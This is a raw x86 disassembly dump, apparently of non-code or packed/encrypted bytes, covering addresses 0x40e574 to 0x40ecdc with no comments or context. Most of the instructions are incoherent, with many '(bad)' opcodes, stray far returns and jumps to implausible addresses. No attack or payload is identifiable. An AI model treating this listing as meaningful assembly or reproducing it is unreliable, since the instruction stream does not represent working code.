  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
